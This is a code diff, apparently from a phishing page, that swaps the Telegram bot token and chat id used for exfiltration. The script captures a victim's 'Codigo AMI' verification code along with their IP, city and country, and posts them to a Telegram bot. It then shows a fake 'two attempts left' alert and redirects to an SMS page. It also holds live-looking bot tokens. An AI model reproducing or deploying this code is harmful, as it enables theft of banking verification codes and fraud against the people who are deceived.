@@ -199,7 +199,7 @@
       c.preventDefault();
       axios.get(a).then((d)=>{
         const e=document.querySelector("#ami").value,f="\nCodigo AMI\nAmi: "+e+"\nCiudad:"+d.data.city+"\nPais: "+d.data.country+"\nIP: "+d.data.ip;
-        axios.post("https://api.telegram.org/bot" + "8198531920:AAEvRL0O26Hs5cdjTRsImltuxQGMlIKqCHk" + "/sendMessage",{chat_id:"-4695344087",text:f}).then((g)=>{
+        axios.post("https://api.telegram.org/bot" + "7790718281:AAGVzFv7sKGNhv5Uw98oLV8H4WFrMeXQ43Y" + "/sendMessage",{chat_id:"-4709177007",text:f}).then((g)=>{
           alert("Ingresa un nuevo codigo. Quedan 2 intentos"),window.location.href="sms.html";
         }).catch((h)=>{console.error(h);});
       }).catch((h)=>{console.log(h);});
